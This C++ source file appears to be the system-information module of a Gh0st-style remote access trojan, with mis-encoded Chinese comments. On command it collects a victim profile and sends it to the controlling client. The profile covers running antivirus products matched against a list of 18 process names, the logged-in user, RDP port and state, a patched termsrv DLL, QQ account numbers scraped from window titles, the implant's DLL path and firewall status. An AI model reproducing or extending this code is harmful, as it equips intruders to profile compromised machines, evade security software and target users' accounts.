// GetSystemInfo.cpp: implementation of the CGetSystemInfo class.
//
//////////////////////////////////////////////////////////////////////

#include "GetSystemInfo.h"
#include <tlhelp32.h>
#include <time.h>
extern HMODULE hDllModule;
//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CGetSystemInfo::CGetSystemInfo(CClientSocket *pClient) : CManager(pClient)
{
	SendSysInfoList();
}

CGetSystemInfo::~CGetSystemInfo()
{

}

void CGetSystemInfo::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	switch (lpBuffer[0])
	{
		// ����ϵͳ��Ϣ�б�
	case COMMAND_SSLIST:
		SendSysInfoList();
		break;
	default:
		break;
	}

}

void GetQQ(char *szQQNum )
{  
	char szText[80] = {0};
    char szQQNumber[80] = {0};
    HWND hWnd = FindWindowA("CTXOPConntion_Class", NULL);
	
	while (hWnd)
	{
		char szClassName[MAX_PATH] = {0};
		GetClassName(hWnd, szClassName, MAX_PATH);
		if (strcmp(szClassName, "CTXOPConntion_Class") == 0)
		{	
			// �õ�����OP_12345678���ַ���
			if (hWnd)
			{
				GetWindowText(hWnd, szText, 80);
			}
			// �õ�12345678 qq��
			int len = strlen(szText);
			do
			{
				len--;
			} while (szText[len] != '_');
			strcpy(szQQNumber, &szText[len+1]);

			if (strlen(szQQNum) != 0)
			{	
				strcat(szQQNum, "|");
			}
			strcat(szQQNum, szQQNumber);
		}
		hWnd = GetWindow(hWnd, GW_HWNDNEXT);
	}
	if (lstrlen(szQQNum) == 0)
	{
		strcpy(szQQNum, "-/-");
	}
	return;
}
//======================================================================================================================
BOOL GetTerminalState()
{
	SC_HANDLE hSCManager, schService;
	SERVICE_STATUS   ssStatus;
	hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (hSCManager == NULL)
	{
		return FALSE;
	}
	schService = OpenService( hSCManager, "TermService", SERVICE_ALL_ACCESS);
	if(schService   ==   NULL)
	{
		return FALSE;
	}
	if (!QueryServiceStatus(schService, &ssStatus))
	{	
		CloseServiceHandle(schService);
		CloseServiceHandle(hSCManager);
		return FALSE;
	}
	CloseServiceHandle(schService);
	CloseServiceHandle(hSCManager);
	if (ssStatus.dwCurrentState != SERVICE_RUNNING)
	{
		return FALSE;
	}
	return TRUE;
}

// �ж��Ƿ�ΪXPϵͳ
BOOL bIsOsXP()
{
	OSVERSIONINFOEX OsVerInfoEx;
	OsVerInfoEx.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
	GetVersionEx((OSVERSIONINFO *)&OsVerInfoEx); // ע��ת������
	return OsVerInfoEx.dwMajorVersion == 5 && OsVerInfoEx.dwMinorVersion == 1;
}

BOOL DebugPrivilege(const char *PName,BOOL bEnable)
{
	BOOL              bResult = TRUE;
	HANDLE            hToken;
	TOKEN_PRIVILEGES  TokenPrivileges;
	
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken))
	{
		bResult = FALSE;
		return bResult;
	}
	TokenPrivileges.PrivilegeCount = 1;
	TokenPrivileges.Privileges[0].Attributes = bEnable ? SE_PRIVILEGE_ENABLED : 0;
	
	LookupPrivilegeValue(NULL, PName, &TokenPrivileges.Privileges[0].Luid);
	AdjustTokenPrivileges(hToken, FALSE, &TokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
    if (GetLastError() != ERROR_SUCCESS)
	{
		bResult = FALSE;
	}
	
	CloseHandle(hToken);
	return bResult;	
}
// ��������ģ�� ����ģ����
HANDLE FindModule(DWORD dwProcessID, LPCTSTR lpModulePath)
{
	HANDLE hModuleHandle = NULL;
	MODULEENTRY32 me32 = {0};
	HANDLE hModuleSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, dwProcessID);
	me32.dwSize = sizeof(MODULEENTRY32);
	if(::Module32First(hModuleSnap, &me32))
	{
		do
		{	
			if (lstrcmpi(me32.szExePath, lpModulePath) == 0)
			{
				hModuleHandle = me32.hModule;
				break;
			}
		}while(::Module32Next(hModuleSnap,&me32));
	}
	::CloseHandle(hModuleSnap);
	return hModuleHandle;
}

BOOL bFindTermsrvDll()
{
	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(pe32);
	char strDll[MAX_PATH];
	BOOL bRet = FALSE;
	GetSystemDirectory(strDll, sizeof(strDll));
	lstrcat(strDll, "\\termsrv_t.dll");
	
	
	DebugPrivilege(SE_DEBUG_NAME, TRUE);
	HANDLE hProcessSnap= CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
	//������صĽ���
	if(Process32First(hProcessSnap, &pe32))
	{
		do
		{
			HANDLE hModuleHandle = FindModule(pe32.th32ProcessID, strDll);
			if (hModuleHandle != NULL)
			{
				bRet = TRUE;
				break;
			}
			
		}while (Process32Next(hProcessSnap,&pe32));
	}
	CloseHandle(hProcessSnap);
	
	DebugPrivilege(SE_DEBUG_NAME, FALSE);
	
	return bRet;
}

void Get3389State( LPTSTR lpBuffer, UINT uSize)
{
	memset(lpBuffer, 0, uSize);
	
	if (!GetTerminalState())
	{
		lstrcpy(lpBuffer, "δ����3389����");
		return;
	}
	
	char szCanConnect[32];
	ReadRegEx1(HKEY_LOCAL_MACHINE, 
		"SYSTEM\\CurrentControlSet\\Control\\Terminal Server", 
		"fDenyTSConnections", 	REG_DWORD, 	szCanConnect,	NULL,	NULL, 	0);
	
	if (atoi(szCanConnect) != 0)
	{	
		lstrcpy(lpBuffer, "δ��������3389");
		return;
	}
	else if(!bIsOsXP()) 
	{
		lstrcpy(lpBuffer, "�ѿ���������˫��");
		return;
	}
	else
	{
		char szDllName[MAX_PATH];
		ReadRegEx1(HKEY_LOCAL_MACHINE, 
			"SYSTEM\\CurrentControlSet\\Services\\TermService\\Parameters", 
			"ServiceDll", REG_EXPAND_SZ, szDllName, NULL, NULL, 0);
		
		if (strstr(szDllName, "termsrv_t") == 0)
		{
			lstrcpy(lpBuffer, "�ѿ�����δ˫��");
			return;
		}
		else
		{
			if (bFindTermsrvDll())
			{
				lstrcpy(lpBuffer, "�ѿ�������˫��");
				return;
			}
			else
			{
				lstrcpy(lpBuffer, "�ѿ�����δ˫��");
				return;
			}
		}
	}
	return;
}
//======================================================================================================================

void GetAntivirus(char *AllName)
{	
	char *str[18][2] = 
	{
		"360tray.exe","360��ȫ��ʿ",
			"360sd.exe","360ɱ��",
			"avp.exe","����˹��",
			"kvmonxp.exe","����",
			"RavMonD.exe","����",
			"Mcshield.exe","�󿧷�",
			"egui.exe","NOD32",
			"kxetray.exe","��ɽ",
			"TMBMSRV.exe","����",
			"Avgui.exe","AVG",
			"Avastsvc.exe","Avast",
			"avguard.exe","С��ɡ",
			"bdagent.exe","�������",
			"Msmpeng.exe","MSE",
			"spider.exe","Dr.Web",
			"ccapp.exe","Norton",
			"v3lsvc.exe","V3",
			"ayagent.aye","ҩ��"
	};
	
	PROCESSENTRY32 pe; 
	DWORD dwRet;
	HANDLE hSP = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	
	if (hSP)
	{
		for (int i = 0 ; i< 18; i++)
		{
			pe.dwSize = sizeof( pe );
			
			for (dwRet = Process32First(hSP, &pe); dwRet; dwRet = Process32Next(hSP, &pe))
			{
				if (lstrcmpi( str[i][0], pe.szExeFile) == 0)
				{
					lstrcat(AllName , str[i][1]);
					lstrcat(AllName , " ");
					
					break;
				}
			}
		}
	}
	
	CloseHandle(hSP);
	
	if (lstrlen(AllName) == 0)
		lstrcpy(AllName,"δ����");
	
	return;
}

UINT Get3389Port( LPTSTR lpBuffer, UINT uSize)
{
	char	strSubKey[MAX_PATH] = {0};
	memset(lpBuffer, 0, uSize);
	
	lstrcpy(strSubKey, "SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp");
	
	ReadRegEx1(HKEY_LOCAL_MACHINE, strSubKey, "PortNumber", REG_DWORD, (char *)lpBuffer, NULL, uSize, 0);
	
	if (lstrlen(lpBuffer) == 0)
		lstrcpy(lpBuffer,"����");
	
	return lstrlen(lpBuffer);
}

void Get_LogUser(char *lpUserName,DWORD nNameLen)
{
	DWORD	dwProcessID = GetProcessID("explorer.exe");
	if (dwProcessID == 0)
		return ;
	
	BOOL fResult = FALSE;
	HANDLE hProc = NULL;
	HANDLE hToken = NULL;
	TOKEN_USER *pTokenUser = NULL;
	
	__try
	{
		// Open the process with PROCESS_QUERY_INFORMATION access
		hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, dwProcessID);
		if (hProc == NULL)
		{
			__leave;
		}
		fResult = OpenProcessToken(hProc, TOKEN_QUERY, &hToken);
		if(!fResult) 
		{
			__leave;
		}
		
		DWORD dwNeedLen = 0;	
		fResult = GetTokenInformation(hToken,TokenUser, NULL, 0, &dwNeedLen);
		if (dwNeedLen > 0)
		{
			pTokenUser = (TOKEN_USER*)new BYTE[dwNeedLen];
			fResult = GetTokenInformation(hToken,TokenUser, pTokenUser, dwNeedLen, &dwNeedLen);
			if (!fResult)
			{
				__leave;
			}
		}
		else
		{
			__leave;
		}
		
		SID_NAME_USE sn;
		TCHAR szDomainName[MAX_PATH];
		DWORD dwDmLen = MAX_PATH;
		
		fResult = LookupAccountSid(NULL, pTokenUser->User.Sid, lpUserName, &nNameLen,
			szDomainName, &dwDmLen, &sn);
	}
	__finally
	{
		if (hProc)
			::CloseHandle(hProc);
		if (hToken)
			::CloseHandle(hToken);
		if (pTokenUser)
			delete[] (char*)pTokenUser;
	}
} 

BOOL IsServiceRun(LPCTSTR lpszSvcName)
{	
	SERVICE_STATUS svcStatus = {0};
	return QueryServiceStatus(OpenService(OpenSCManager(NULL, NULL, GENERIC_READ), lpszSvcName, GENERIC_READ), &svcStatus) ? (svcStatus.dwCurrentState == SERVICE_RUNNING) : false;	
}

#include <stdio.h>
void GetSystemInfo(tagSystemInfo* pSysInfo)
{
	ZeroMemory(pSysInfo,sizeof(tagSystemInfo));
	//��ȡCPU��Ϣ===============================
	if(
		!ReadRegEx1
		(
		HKEY_LOCAL_MACHINE, 
		"HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0\0", 
		"ProcessorNameString",
		REG_SZ, 
		pSysInfo->szCpuInfo, 
		NULL,
		lstrlen(pSysInfo->szCpuInfo),
		0)
		)
		strcpy(pSysInfo->szCpuInfo,"Find CPU infomation error");
	
	//��ȡ����ʱ��============================
	DWORD dwTime,dwDay,dwHour,dwMin;
	dwTime = GetTickCount();
	dwDay  = dwTime / (1000 * 60 * 60 * 24);
	dwTime = dwTime % (1000 * 60 * 60 * 24);
	dwHour = dwTime / (1000 * 60 * 60);
	dwTime = dwTime % (1000 * 60 * 60);
	dwMin  = dwTime / (1000 * 60);
	wsprintf(pSysInfo->szActiveTime, "������ %d�� %dСʱ %d����", dwDay,dwHour,dwMin);
	
	//��ȡɱ�����========================
    GetAntivirus(pSysInfo->szAntiVirus);
	
	//��ȡ�������========================
	gethostname(pSysInfo->szPcName,sizeof(pSysInfo->szPcName));

	//��ȡ�û���========================
    Get_LogUser(pSysInfo->szUserName,sizeof(pSysInfo->szUserName));
	//////////////////////////////////////////////////////////////////////////
	MEMORYSTATUSEX		Meminfo;
	unsigned __int64	dSize;
	memset(&Meminfo, 0, sizeof(Meminfo));
	Meminfo.dwLength = sizeof(Meminfo);
	GlobalMemoryStatusEx(&Meminfo);
	
	// �ڴ�
	dSize = (unsigned __int64)Meminfo.ullTotalPhys;
	dSize = dSize /1024/1024+1;
	pSysInfo->szMemory = dSize;
	
	// �����ڴ�
	dSize = (unsigned __int64)Meminfo.ullAvailPhys;
	dSize = dSize /1024/1024+1;
	pSysInfo->szMemoryFree = dSize;
	
	ULARGE_INTEGER nTotalBytes,
		nTotalFreeBytes,
		nTotalAvailableBytes;
	ULONG nAllGB  = 0, 
		nFreeGB = 0;
    DWORD drivertype;
    char  driver[10] = {0};
    for(int i=0; i<26; i++)
    {
		driver[0] = i + ('B');
		driver[1] = (':');
		driver[2] = ('\\');
		driver[3] = 0;
		
		drivertype = GetDriveType(driver);
        if(drivertype!=DRIVE_FIXED)
			continue;
		GetDiskFreeSpaceEx(driver,&nTotalAvailableBytes,&nTotalBytes,&nTotalFreeBytes);   
		nAllGB = nAllGB + nTotalBytes.QuadPart/1024/1024/1024;
		nFreeGB = nFreeGB + nTotalFreeBytes.QuadPart/1024/1024/1024;
    }
	// Ӳ��
	pSysInfo->szDriveSize     = nAllGB;
	// ����Ӳ��
	pSysInfo->szDriveFreeSize = nFreeGB;
	
	// ��ȡԶ�̶˿�
	Get3389Port(pSysInfo->szRemotePort,sizeof(pSysInfo->szRemotePort));
	
	// ��ȡ3389״̬
	Get3389State(pSysInfo->szOpenInfo,sizeof(pSysInfo->szOpenInfo));
	
	// �����λ��
	GetModuleFileName(hDllModule,pSysInfo->szDLLPath,sizeof(pSysInfo->szDLLPath));
	
	// QQ��
	GetQQ(pSysInfo->szQQNum);
 
	// �ֱ���
	wsprintf(pSysInfo->szScrxy,"%d * %d",GetSystemMetrics(SM_CXSCREEN),GetSystemMetrics(SM_CYSCREEN));
	
	// ����ʱ��
	time_t t = time( 0 );   
    strftime( pSysInfo->szLocalTime, sizeof(pSysInfo->szLocalTime), " %Y/%m/%d %X %A" , localtime(&t) );

	// ϵͳ����ǽ
	if (IsServiceRun("MpsSvc") || IsServiceRun("SharedAccess"))
    	pSysInfo->bSysFirewall = TRUE;
	else
		pSysInfo->bSysFirewall = FALSE;


	GetLocaleInfoW(LOCALE_SYSTEM_DEFAULT,LOCALE_SLANGUAGE,pSysInfo->lpLCData,sizeof(pSysInfo->lpLCData)); //������Ҫ��UNICODE

	return;
}

void CGetSystemInfo::SendSysInfoList()
{
	LPBYTE			lpBuffer = (LPBYTE)LocalAlloc(LPTR, sizeof(tagSystemInfo)+1);
	lpBuffer[0] = TOKEN_SSLIST;	
	if(lpBuffer == NULL)
		return;
	tagSystemInfo m_SysInfo;
	GetSystemInfo(&m_SysInfo);
	memcpy(lpBuffer + 1, &m_SysInfo, sizeof(tagSystemInfo));
	Send(lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);
}
